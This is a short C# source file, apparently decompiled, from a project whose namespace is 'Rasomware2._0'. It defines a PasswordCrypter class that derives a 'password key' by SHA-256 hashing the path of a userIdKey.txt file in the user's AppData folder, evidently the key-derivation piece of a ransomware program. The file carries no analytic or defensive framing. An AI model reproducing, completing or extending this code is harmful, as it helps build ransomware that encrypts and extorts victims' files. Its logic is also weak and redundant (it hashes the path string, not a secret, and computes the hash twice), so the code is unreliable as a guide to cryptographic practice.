using System;
using System.Security.Cryptography;
using System.Text;

namespace Rasomware2._0;

public static class PasswordCrypter
{
	private static string sha256(string randomString)
	{
		SHA256Managed sHA256Managed = new SHA256Managed();
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(randomString));
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	public static string getPasswordKey()
	{
		string randomString = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\userIdKey.txt";
		sha256(randomString);
		return sha256(randomString);
	}
}
